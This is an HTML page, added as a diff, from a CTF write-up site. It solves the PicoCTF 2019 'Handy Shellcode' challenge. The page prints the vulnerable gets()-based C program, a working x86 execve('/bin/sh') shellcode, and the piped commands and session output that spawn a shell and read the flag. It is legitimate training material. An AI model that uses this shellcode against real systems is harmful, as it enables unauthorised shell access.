@@ -1,0 +1,129 @@
+<!doctype html><html lang=en class="sidebar-visible no-js ayu"><meta charset=utf-8><title>PicoCTF19 Handy Shellcode - Capture The Flag</title><meta charset=utf-8><meta name=description content><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#ffffff"><link rel="shortcut icon" href=../../favicon.png><link rel=stylesheet href=../../css/variables.css><link rel=stylesheet href=../../css/general.css><link rel=stylesheet href=../../css/chrome.css><link rel=stylesheet href=../../css/print.css media=print><link rel=stylesheet href=../../FontAwesome/css/font-awesome.css><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel=stylesheet><link rel=stylesheet href=../../highlight.css><link rel=stylesheet href=../../tomorrow-night.css><link rel=stylesheet href=../../ayu-highlight.css><link rel=stylesheet href=../../theme/mermaid.css><script>var path_to_root="../../";var default_theme=window.matchMedia("(prefers-color-scheme: dark)").matches?"ayu":"ayu";</script><script>try{var theme=localStorage.getItem('mdbook-theme');var sidebar=localStorage.getItem('mdbook-sidebar');if(theme.startsWith('"')&&theme.endsWith('"')){localStorage.setItem('mdbook-theme',theme.slice(1,theme.length-1));}
+if(sidebar.startsWith('"')&&sidebar.endsWith('"')){localStorage.setItem('mdbook-sidebar',sidebar.slice(1,sidebar.length-1));}}catch(e){}</script><script>var theme;try{theme=localStorage.getItem('mdbook-theme');}catch(e){}
+if(theme===null||theme===undefined){theme=default_theme;}
+var html=document.querySelector('html');html.classList.remove('no-js')
+html.classList.remove('ayu')
+html.classList.add(theme);html.classList.add('js');</script><script>var html=document.querySelector('html');var sidebar='hidden';if(document.body.clientWidth>=1080){try{sidebar=localStorage.getItem('mdbook-sidebar');}catch(e){}
+sidebar=sidebar||'visible';}
+html.classList.remove('sidebar-visible');html.classList.add("sidebar-"+sidebar);</script><nav id=sidebar class=sidebar aria-label="Table of contents"><div id=sidebar-scrollbox class=sidebar-scrollbox><ol class=chapter><li class=expanded><a href=../../index.html><strong aria-hidden=true>1.</strong> Introduction</a><li class=expanded><a href=../../MISCELLANEOUS.html><strong aria-hidden=true>2.</strong> Miscellaneous</a><li class=expanded><a href=../../ctf/index.html><strong aria-hidden=true>3.</strong> Capture The Flag</a><li><ol class=section><li class=expanded><a href=../../ctf/crypto/index.html><strong aria-hidden=true>3.1.</strong> Crypto</a><li><ol class=section><li class=expanded><a href=../../ctf/crypto/hackcon18-caesar.html><strong aria-hidden=true>3.1.1.</strong> Hackcon2018 Caesar Salad</a><li class=expanded><a href=../../ctf/crypto/hackcon18-salad.html><strong aria-hidden=true>3.1.2.</strong> Hackcon2018 Salad Up.</a><li class=expanded><a href=../../ctf/crypto/icectf18q-garfield.html><strong aria-hidden=true>3.1.3.</strong> IceCTF18Q Garfield</a><li class=expanded><a href=../../ctf/crypto/tjctf18-classic.html><strong aria-hidden=true>3.1.4.</strong> TJCTF18 Classic</a><li class=expanded><a href=../../ctf/crypto/picoctf19-numbers.html><strong aria-hidden=true>3.1.5.</strong> PicoCTF19 The Numbers</a><li class=expanded><a href=../../ctf/crypto/picoctf19-caesar.html><strong aria-hidden=true>3.1.6.</strong> PicoCTF19 Caesar</a><li class=expanded><a href=../../ctf/crypto/picoctf19-wavesoverlambda.html><strong aria-hidden=true>3.1.7.</strong> PicoCTF19 Waves Lambda</a><li class=expanded><a href=../../ctf/crypto/picoctf19-lacifrede.html><strong aria-hidden=true>3.1.8.</strong> PicoCTF19 La Cifra De</a><li class=expanded><a href=../../ctf/crypto/picoctf19-rsapopquiz.html><strong aria-hidden=true>3.1.9.</strong> PicoCTF19 RSA Pop Quiz</a><li class=expanded><a href=../../ctf/crypto/picoctf19-minirsa.html><strong aria-hidden=true>3.1.10.</strong> PicoCTF19 miniRSA</a><li class=expanded><a href=../../ctf/crypto/picoctf19-b00tl3gRSA2.html><strong aria-hidden=true>3.1.11.</strong> PicoCTF19 b00tl3gRSA2</a><li class=expanded><a href=../../ctf/crypto/picoctf19-b00tl3gRSA3.html><strong aria-hidden=true>3.1.12.</strong> PicoCTF19 b00tl3gRSA3</a><li class=expanded><a href=../../ctf/crypto/picoctf19-john_pollard.html><strong aria-hidden=true>3.1.13.</strong> PicoCTF19 john_pollard</a><li class=expanded><a href=../../ctf/crypto/picoctf19-aesabc.html><strong aria-hidden=true>3.1.14.</strong> PicoCTF19 AES-ABC</a></ol><li class=expanded><a href=../../ctf/forensics/index.html><strong aria-hidden=true>3.2.</strong> Forensics</a><li><ol class=section><li class=expanded><a href=../../ctf/forensics/picoctf19-garden.html><strong aria-hidden=true>3.2.1.</strong> PicoCTF19 Garden</a><li class=expanded><a href=../../ctf/forensics/picoctf19-unzip.html><strong aria-hidden=true>3.2.2.</strong> PicoCTF19 Unzip</a><li class=expanded><a href=../../ctf/forensics/picoctf19-so-meta.html><strong aria-hidden=true>3.2.3.</strong> PicoCTF19 So Meta</a><li class=expanded><a href=../../ctf/forensics/picoctf19-what-lies-within.html><strong aria-hidden=true>3.2.4.</strong> PicoCTF19 Lies Within</a><li class=expanded><a href=../../ctf/forensics/picoctf19-extensions.html><strong aria-hidden=true>3.2.5.</strong> PicoCTF19 Extensions</a><li class=expanded><a href=../../ctf/forensics/picoctf19-shark-on-wire-1.html><strong aria-hidden=true>3.2.6.</strong> PicoCTF19 Shark Wire</a><li class=expanded><a href=../../ctf/forensics/picoctf19-whitepages.html><strong aria-hidden=true>3.2.7.</strong> PicoCTF19 WhitePages</a><li class=expanded><a href=../../ctf/forensics/picoctf19-like1000.html><strong aria-hidden=true>3.2.8.</strong> PicoCTF19 like1000</a></ol><li class=expanded><a href=../../ctf/web/index.html><strong aria-hidden=true>3.3.</strong> Web</a><li><ol class=section><li class=expanded><a href=../../ctf/web/seccon19-web_search.html><strong aria-hidden=true>3.3.1.</strong> SECCON19 Web Search</a><li class=expanded><a href=../../ctf/web/tmctf19-finals-containers.html><strong aria-hidden=true>3.3.2.</strong> TMCTF19F Container</a></ol><li class=expanded><a href=../../ctf/binary/index.html><strong aria-hidden=true>3.4.</strong> Binary Exploitation</a><li><ol class=section><li class=expanded><a href=../../ctf/binary/picoctf19-handy_shellcode.html class=active><strong aria-hidden=true>3.4.1.</strong> PicoCTF19 Handy Shellcode</a></ol></ol></ol></div><div id=sidebar-resize-handle class=sidebar-resize-handle></div></nav><div id=page-wrapper class=page-wrapper><div class=page><div id=menu-bar class=menu-bar><div id=menu-bar-sticky-container><div class=left-buttons><button id=sidebar-toggle class=icon-button type=button title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls=sidebar>
+<i class="fa fa-bars"></i></button>
+<button id=theme-toggle class=icon-button type=button title="Change theme" aria-label="Change theme" aria-haspopup=true aria-expanded=false aria-controls=theme-list>
+<i class="fa fa-paint-brush"></i></button><ul id=theme-list class=theme-popup aria-label=Themes role=menu><li role=none><button role=menuitem class=theme id=light>Light</button><li role=none><button role=menuitem class=theme id=rust>Rust</button><li role=none><button role=menuitem class=theme id=coal>Coal</button><li role=none><button role=menuitem class=theme id=navy>Navy</button><li role=none><button role=menuitem class=theme id=ayu>Ayu (default)</button></ul><button id=search-toggle class=icon-button type=button title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded=false aria-keyshortcuts=S aria-controls=searchbar>
+<i class="fa fa-search"></i></button></div><h1 class=menu-title>Capture The Flag</h1><div class=right-buttons><a href=../../print.html title="Print this book" aria-label="Print this book"><i id=print-button class="fa fa-print"></i></a><a href=https://github.com/sgama/ctf.samsongama.com title="Git repository" aria-label="Git repository"><i id=git-repository-button class="fa fa-github"></i></a></div></div></div><div id=search-wrapper class=hidden><form id=searchbar-outer class=searchbar-outer><input type=search name=search id=searchbar name=searchbar placeholder="Search this book ..." aria-controls=searchresults-outer aria-describedby=searchresults-header></form><div id=searchresults-outer class="searchresults-outer hidden"><div id=searchresults-header class=searchresults-header></div><ul id=searchresults></ul></div></div><script>document.getElementById('sidebar-toggle').setAttribute('aria-expanded',sidebar==='visible');document.getElementById('sidebar').setAttribute('aria-hidden',sidebar!=='visible');Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link){link.setAttribute('tabIndex',sidebar==='visible'?0:-1);});</script><div id=content class=content><main><h1><a class=header href=#picoctf19-handy-shellcode id=picoctf19-handy-shellcode>PicoCTF19 Handy Shellcode</a></h1><h2><a class=header href=#challenge id=challenge>Challenge</a></h2><p>This <a href=https://2019shell1.picoctf.com/static/55d1e7f761111a3cf6eec259e5dc44f8/vuln>program</a> executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode on the shell server. <a href=https://2019shell1.picoctf.com/static/55d1e7f761111a3cf6eec259e5dc44f8/vuln.c>Source</a>.<h2><a class=header href=#hints id=hints>Hints</a></h2><p>You might be able to find some good shellcode online.<h2><a class=header href=#solution id=solution>Solution</a></h2><p>Let's view that directory:<pre><code class=language-bash>samson@pico-2019-shell1:/problems/handy-shellcode$ ls -al
+total 732
+drwxr-xr-x   2 root       root                4096 Sep 28 21:53 .
+drwxr-x--x 684 root       root               69632 Oct 10 18:02 ..
+-r--r-----   1 hacksports handy-shellcode_5     39 Sep 28 21:53 flag.txt
+-rwxr-sr-x   1 hacksports handy-shellcode_5 661832 Sep 28 21:53 vuln
+-rw-rw-r--   1 hacksports hacksports           624 Sep 28 21:53 vuln.c
+</code></pre><p>As my user is currently <code>samson</code> and I am not in that handy-shellcode_5 group, I cannot <code>cat</code> the file <code>flag.txt</code>. Let's take a look at the source code.<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+#define BUFSIZE 148
+#define FLAGSIZE 128
+
+void vuln(char *buf){
+  gets(buf);
+  puts(buf);
+}
+
+int main(int argc, char **argv){
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  // Set the gid to the effective gid
+  // this prevents /bin/sh from dropping the privileges
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  char buf[BUFSIZE];
+  puts(&quot;Enter your shellcode:&quot;);
+  vuln(buf);
+  puts(&quot;Thanks! Executing now...&quot;);
+  ((void (*)())buf)();
+  puts(&quot;Finishing Executing Shellcode. Exiting now...&quot;);
+  return 0;
+}
+</code></pre><p>It seems like it's almost prompting us to enter shellcode and execute it. More precisely, it takes in our input and echos it out with the <code>gets()</code> and <code>puts()</code> function calls.<p>Then we have this line here:<pre><code>  ((void (*)())buf)();
+</code></pre><p>This takes <code>buf</code>, casts it to the void function pointer which returns nothing and then runs that function. So it'll execute whatever is at the address fo <code>buf</code>.<p>Let's test our assumptions....<pre><code class=language-bash>samson@pico-2019-shell1:/problems/handy-shellcode$ ./vuln
+Enter your shellcode:
+A    
+A
+Thanks! Executing now...
+Segmentation fault (core dumped)
+</code></pre><p>So what is shellcode? Basically it's raw assembly code to be executed.<p>So let's go to a handy website full of these shellcodes: <a href=http://shell-storm.org/shellcode/>http://shell-storm.org/shellcode/</a><p>But before we decide which shellcode to use, we need to know our end goal. We want to drop into a shell that will let us <code>cat</code> or <code>print</code> the file <code>flag.txt</code>.<p>Let's start with dropping into a shell, is there a shellcode for <code>/bin/sh</code>.... Yes.<hr><p>Let's use this one: <a href=http://shell-storm.org/shellcode/files/shellcode-811.php>http://shell-storm.org/shellcode/files/shellcode-811.php</a><pre><code>/*
+Title:	Linux x86 execve(&quot;/bin/sh&quot;) - 28 bytes
+Author:	Jean Pascal Pereira &lt;pereira@secbiz.de&gt;
+Web:	http://0xffe4.org
+
+
+Disassembly of section .text:
+
+08048060 &lt;_start&gt;:
+ 8048060: 31 c0                 xor    %eax,%eax
+ 8048062: 50                    push   %eax
+ 8048063: 68 2f 2f 73 68        push   $0x68732f2f
+ 8048068: 68 2f 62 69 6e        push   $0x6e69622f
+ 804806d: 89 e3                 mov    %esp,%ebx
+ 804806f: 89 c1                 mov    %eax,%ecx
+ 8048071: 89 c2                 mov    %eax,%edx
+ 8048073: b0 0b                 mov    $0xb,%al
+ 8048075: cd 80                 int    $0x80
+ 8048077: 31 c0                 xor    %eax,%eax
+ 8048079: 40                    inc    %eax
+ 804807a: cd 80                 int    $0x80
+
+
+
+*/
+
+#include &lt;stdio.h&gt;
+
+char shellcode[] = &quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;
+                   &quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;
+                   &quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;
+                   &quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;;
+
+int main()
+{
+  fprintf(stdout,&quot;Lenght: %d\n&quot;,strlen(shellcode));
+  (*(void  (*)()) shellcode)();
+}
+
+</code></pre><p>But let's get that shellcode onto one line:<p><code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</code><p>Let's try it?<pre><code class=language-bash>samson@pico-2019-shell1:/problems/handy-shellcode$ ./vuln 
+Enter your shellcode:
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+Thanks! Executing now...
+Segmentation fault (core dumped)
+</code></pre><p>Wait that's not how we enter shellcode. We need the shell to interpret the <code>\x</code> as bytes not strings.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/handy-shellcode$ python -c &quot;print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'&quot; | ./vuln
+Enter your shellcode:
+1�Ph//shh/bin����°
+                 ̀1�@̀
+Thanks! Executing now...
+</code></pre><p>Awesome it worked but it won't hold a shell for us, so let's use <code>cat</code>. To recap, if you <code>cat file.txt</code>, it'll just print out the contents of the file. However, if you just type <code>cat</code>, it will echo back whatever input you give it until you quit the program. Let's try it out.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/handy-shellcode$ (python -c &quot;print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'&quot;; cat) | ./vuln
+Enter your shellcode:
+1�Ph//shh/bin����°
+                 ̀1�@̀
+Thanks! Executing now...
+id
+uid=30646(samson) gid=8874(handy-shellcode_5) groups=8874(handy-shellcode_5),1002(competitors),30647(samson)
+ls -al      
+total 732
+drwxr-xr-x   2 root       root                4096 Sep 28 21:53 .
+drwxr-x--x 684 root       root               69632 Oct 10 18:02 ..
+-r--r-----   1 hacksports handy-shellcode_5     39 Sep 28 21:53 flag.txt
+-rwxr-sr-x   1 hacksports handy-shellcode_5 661832 Sep 28 21:53 vuln
+-rw-rw-r--   1 hacksports hacksports           624 Sep 28 21:53 vuln.c
+cat flag.txt
+picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}
+</code></pre><h2><a class=header href=#flag id=flag>Flag</a></h2><p><code>picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}</code><h2><a class=header href=#alternative-solution id=alternative-solution>Alternative solution</a></h2><p>The PicoCTF Shell comes with Python and Pwntools preinstalled so we could have leveraged this as well.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/handy-shellcode$ (python -c &quot;import pwn; print(pwn.asm(pwn.shellcraft.linux.sh()))&quot;; cat) | ./vuln
+Enter your shellcode:
+jhh///sh/bin��h�4$ri1�QjY�Q��1�j
+                                X̀
+Thanks! Executing now...
+cat flag.txt
+picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}
+</code></pre></main><nav class=nav-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/index.html class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"><a href=../../ctf/binary/index.html class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a></nav></div><script>window.playpen_copyable=true;</script><script src=../../elasticlunr.min.js></script><script src=../../mark.min.js></script><script src=../../searcher.js></script><script src=../../clipboard.min.js></script><script src=../../highlight.js></script><script src=../../book.js></script><script src=../../theme/mermaid.js></script>
